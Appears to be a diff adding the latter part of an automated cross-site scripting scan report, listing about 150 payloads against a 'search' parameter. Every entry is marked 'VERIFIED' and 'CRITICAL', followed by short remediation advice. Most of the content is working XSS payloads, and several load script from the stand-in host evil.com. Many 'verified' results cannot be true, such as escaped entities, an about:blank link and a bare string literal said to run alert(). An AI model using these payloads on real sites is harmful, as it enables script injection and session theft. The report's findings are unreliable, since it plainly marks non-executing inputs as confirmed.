+
+[405] Parameter: search
+    Payload: </script><script>alert(1)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[406] Parameter: search
+    Payload: </script><img src=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[407] Parameter: search
+    Payload: </script><svg onload=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[408] Parameter: search
+    Payload: --><script>alert(1)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[409] Parameter: search
+    Payload: --!><script>alert(1)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[410] Parameter: search
+    Payload: <q/oncut=prompt(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[411] Parameter: search
+    Payload: <q/onclick=prompt(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[412] Parameter: search
+    Payload: <q/ondrag=prompt(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[413] Parameter: search
+    Payload: <q/onerror=prompt(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[414] Parameter: search
+    Payload: <a href=#x onclick=alert(1)>X</a>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[415] Parameter: search
+    Payload: <a name=x onclick=alert(1)>X</a>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[416] Parameter: search
+    Payload: <a href=x target=_blank onclick=alert(1)>X</a>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[417] Parameter: search
+    Payload: '">><marquee onstart=confirm(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[418] Parameter: search
+    Payload: '">><marquee onstart=prompt(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[419] Parameter: search
+    Payload: '">><div onmouseover=alert(1)>X</div>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[420] Parameter: search
+    Payload: <img src=x oneonerrorrror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[421] Parameter: search
+    Payload: <img src=x onerror=alert(1) onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[422] Parameter: search
+    Payload: <button formaction=javascript:alert(1)>X</button>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[423] Parameter: search
+    Payload: <input type=submit formaction=javascript:alert(1) value=X>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[424] Parameter: search
+    Payload: <form action=javascript:alert(1)><button>X</button></form>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[425] Parameter: search
+    Payload: <video poster=javascript:alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[426] Parameter: search
+    Payload: <html manifest=javascript:alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[427] Parameter: search
+    Payload: <html xmlns:xss><xss:script>alert(1)</xss:script></html>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[428] Parameter: search
+    Payload: <img lowsrc=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[429] Parameter: search
+    Payload: <img dynsrc=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[430] Parameter: search
+    Payload: <a href=vbscript:msgbox(1)>X</a>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[431] Parameter: search
+    Payload: <a href=about:blank>X</a>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[432] Parameter: search
+    Payload: <input pattern=".*" title="test" onmouseover=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[433] Parameter: search
+    Payload: <input placeholder="test" onmouseover=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[434] Parameter: search
+    Payload: <div title="test" onmouseover=alert(1)>X</div>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[435] Parameter: search
+    Payload: <img alt="test" src=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[436] Parameter: search
+    Payload: <blockquote cite=javascript:alert(1)>X</blockquote>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[437] Parameter: search
+    Payload: <img longdesc=javascript:alert(1) src=x>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[438] Parameter: search
+    Payload: <img usemap=#x src=x><map name=x><area onclick=alert(1)></map>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[439] Parameter: search
+    Payload: <img ismap src=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[440] Parameter: search
+    Payload: <input dirname=test onchange=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[441] Parameter: search
+    Payload: <svg><script>alert&#40;1&#41;</script></svg>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[442] Parameter: search
+    Payload: <svg><script>alert&#x28;1&#x29;</script></svg>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[443] Parameter: search
+    Payload: <svg><script>&#97;lert(1)</script></svg>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[444] Parameter: search
+    Payload: <div style="xss:expression(alert(1))">X</div>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[445] Parameter: search
+    Payload: <div style="background:expression(alert(1))">X</div>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[446] Parameter: search
+    Payload: <script type=importmap>{"imports":{"x":"javascript:alert(1)"}}</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[447] Parameter: search
+    Payload: <div id=x><template shadowroot=open><style>*{color:red}</style><img src=x onerror=alert(1)></template></div>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[448] Parameter: search
+    Payload: <iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[449] Parameter: search
+    Payload: <object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[450] Parameter: search
+    Payload: <embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[451] Parameter: search
+    Payload: <image src=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[452] Parameter: search
+    Payload: <isindex type=submit value=X onclick=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[453] Parameter: search
+    Payload: <bgsound src=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[454] Parameter: search
+    Payload: <applet code=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[455] Parameter: search
+    Payload: <script>al\u0065rt(1)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[456] Parameter: search
+    Payload: <script>al\x65rt(1)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[457] Parameter: search
+    Payload: <script>eval('al'+'ert(1)')</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[458] Parameter: search
+    Payload: <script>eval('al\x65rt(1)')</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[459] Parameter: search
+    Payload: <script>[1].find(alert)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[460] Parameter: search
+    Payload: <script>top['al'+'ert'](1)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[461] Parameter: search
+    Payload: <script>top[/al/.source+/ert/.source](1)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[462] Parameter: search
+    Payload: <script>top[8680439..toString(30)](1)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[463] Parameter: search
+    Payload: &lt;script&gt;alert(1)&lt;/script&gt;
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[464] Parameter: search
+    Payload: &#60;script&#62;alert(1)&#60;/script&#62;
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[465] Parameter: search
+    Payload: &#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[466] Parameter: search
+    Payload: <script>alert(1)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[467] Parameter: search
+    Payload: <img src=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[468] Parameter: search
+    Payload: <script/src=//evil.com></script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[469] Parameter: search
+    Payload: <script	src=//evil.com></script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[470] Parameter: search
+    Payload: src=//evil.com></script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[471] Parameter: search
+    Payload: <noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[472] Parameter: search
+    Payload: <noscript><iframe></noscript><img src=x onerror=alert(1)></iframe></noscript>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[473] Parameter: search
+    Payload: <listing>&lt;img src=x onerror=alert(1)&gt;</listing>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[474] Parameter: search
+    Payload: <textarea>&lt;img src=x onerror=alert(1)&gt;</textarea>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[475] Parameter: search
+    Payload: <xmp>&lt;img src=x onerror=alert(1)&gt;</xmp>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[476] Parameter: search
+    Payload: <svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[477] Parameter: search
+    Payload: <svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[478] Parameter: search
+    Payload: <template><slot onfocus=alert(1) autofocus></slot></template>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[479] Parameter: search
+    Payload: <input type=text onfocus=alert(1) autofocus>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[480] Parameter: search
+    Payload: <input type=password onfocus=alert(1) autofocus>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[481] Parameter: search
+    Payload: <input type=email onfocus=alert(1) autofocus>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[482] Parameter: search
+    Payload: <input type=number onfocus=alert(1) autofocus>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[483] Parameter: search
+    Payload: <input type=search onfocus=alert(1) autofocus>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[484] Parameter: search
+    Payload: <input type=tel onfocus=alert(1) autofocus>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[485] Parameter: search
+    Payload: <input type=url onfocus=alert(1) autofocus>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[486] Parameter: search
+    Payload: <input type=date onfocus=alert(1) autofocus>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[487] Parameter: search
+    Payload: <input type=time onfocus=alert(1) autofocus>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[488] Parameter: search
+    Payload: <input type=datetime-local onfocus=alert(1) autofocus>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[489] Parameter: search
+    Payload: <input type=month onfocus=alert(1) autofocus>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[490] Parameter: search
+    Payload: <input type=week onfocus=alert(1) autofocus>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[491] Parameter: search
+    Payload: <input type=color onfocus=alert(1) autofocus>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[492] Parameter: search
+    Payload: <input type=range onfocus=alert(1) autofocus>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[493] Parameter: search
+    Payload: <input type=button onclick=alert(1) value=X>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[494] Parameter: search
+    Payload: <input type=reset onclick=alert(1) value=X>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[495] Parameter: search
+    Payload: <input type=submit onclick=alert(1) value=X>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[496] Parameter: search
+    Payload: <datalist onmouseover=alert(1)>X</datalist>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[497] Parameter: search
+    Payload: <input list=x><datalist id=x><option onclick=alert(1)>X</option></datalist>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[498] Parameter: search
+    Payload: <keygen onfocus=alert(1) autofocus>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[499] Parameter: search
+    Payload: <keygen onchange=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[500] Parameter: search
+    Payload: <custom-element onclick=alert(1)>X</custom-element>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[501] Parameter: search
+    Payload: <img srcset=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[502] Parameter: search
+    Payload: <source srcset=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[503] Parameter: search
+    Payload: <img sizes="100vw" srcset=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[504] Parameter: search
+    Payload: <img crossorigin=anonymous src=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[505] Parameter: search
+    Payload: <script crossorigin=anonymous src=x onerror=alert(1)></script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[506] Parameter: search
+    Payload: <script integrity="sha384-x" src=x onerror=alert(1)></script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[507] Parameter: search
+    Payload: <img referrerpolicy=no-referrer src=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[508] Parameter: search
+    Payload: <img loading=lazy src=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[509] Parameter: search
+    Payload: <img decoding=async src=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[510] Parameter: search
+    Payload: <img importance=high src=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[511] Parameter: search
+    Payload: <img src=x onabort=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[512] Parameter: search
+    Payload: <img src=x onwaiting=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[513] Parameter: search
+    Payload: <img src=x onseeking=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[514] Parameter: search
+    Payload: <img src=x onseeked=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[515] Parameter: search
+    Payload: <img src=x onplaying=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[516] Parameter: search
+    Payload: <img src=x onplay=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[517] Parameter: search
+    Payload: <img src=x onpause=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[518] Parameter: search
+    Payload: <img src=x onloadstart=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[519] Parameter: search
+    Payload: <img src=x onloadedmetadata=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[520] Parameter: search
+    Payload: <img src=x onloadeddata=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[521] Parameter: search
+    Payload: <img src=x onended=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[522] Parameter: search
+    Payload: <img src=x ondurationchange=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[523] Parameter: search
+    Payload: <img src=x oncanplaythrough=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[524] Parameter: search
+    Payload: <img src=x oncanplay=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[525] Parameter: search
+    Payload: <iframe sandbox=allow-scripts src=data:text/html,<script>alert(1)</script>>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[526] Parameter: search
+    Payload: <iframe sandbox=allow-scripts srcdoc="<script>alert(1)</script>">
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[527] Parameter: search
+    Payload: <root><![CDATA[<script>alert(1)</script>]]></root>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[528] Parameter: search
+    Payload: <script>alert(document.domain)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[529] Parameter: search
+    Payload: <script>alert(window.location)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[530] Parameter: search
+    Payload: <script>alert(navigator.userAgent)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[531] Parameter: search
+    Payload: <script>alert(localStorage.getItem('test'))</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[532] Parameter: search
+    Payload: <script>alert(sessionStorage.getItem('test'))</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[533] Parameter: search
+    Payload: <script>'alert\u0028document.domain\u0029'</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[534] Parameter: search
+    Payload: <script>alert(window.name)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[535] Parameter: search
+    Payload: <script>alert(window.safari)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[536] Parameter: search
+    Payload: <script>alert(window.chrome)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[537] Parameter: search
+    Payload: <blink onmouseover=alert(1)>X</blink>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[538] Parameter: search
+    Payload: <acronym onmouseover=alert(1)>X</acronym>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[539] Parameter: search
+    Payload: <big onmouseover=alert(1)>X</big>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[540] Parameter: search
+    Payload: <center onmouseover=alert(1)>X</center>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[541] Parameter: search
+    Payload: <dir onmouseover=alert(1)>X</dir>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[542] Parameter: search
+    Payload: <font onmouseover=alert(1)>X</font>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[543] Parameter: search
+    Payload: <frame onload=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[544] Parameter: search
+    Payload: <frameset onload=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[545] Parameter: search
+    Payload: <noframes onload=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[546] Parameter: search
+    Payload: <strike onmouseover=alert(1)>X</strike>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[547] Parameter: search
+    Payload: <tt onmouseover=alert(1)>X</tt>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[548] Parameter: search
+    Payload: <script>alert(1);alert(2);alert(3)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[549] Parameter: search
+    Payload: <script>for(i=0;i<3;i++){alert(i)}</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[550] Parameter: search
+    Payload: <script>while(1){alert(1);break}</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[551] Parameter: search
+    Payload: <script>if(1){alert(1)}</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[552] Parameter: search
+    Payload: <script>try{alert(1)}catch(e){}</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[553] Parameter: search
+    Payload: <script>alert(1)||alert(2)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[554] Parameter: search
+    Payload: <script>alert(1)&&alert(2)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[555] Parameter: search
+    Payload: <script>alert(1)?alert(2):alert(3)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[556] Parameter: search
+    Payload: <script>alert([1,2,3])</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[557] Parameter: search
+    Payload: <script>alert({x:1,y:2})</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[558] Parameter: search
+    Payload: <script>alert(function(){return 1}())</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[559] Parameter: search
+    Payload: <script>alert((()=>1)())</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[560] Parameter: search
+    Payload: <script>alert(class{constructor(){return 1}})</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+
+REMEDIATION RECOMMENDATIONS
+---------------------------
+1. Implement proper output encoding based on context (HTML, JavaScript, URL, CSS)
+2. Use Content Security Policy (CSP) headers
+3. Validate and sanitize all user inputs on the server-side
+4. Use HTTPOnly and Secure flags for cookies
+5. Consider using a Web Application Firewall (WAF)
+
+
+================================================================================
+                              End of Report
+================================================================================
+
+Generated by XSScan
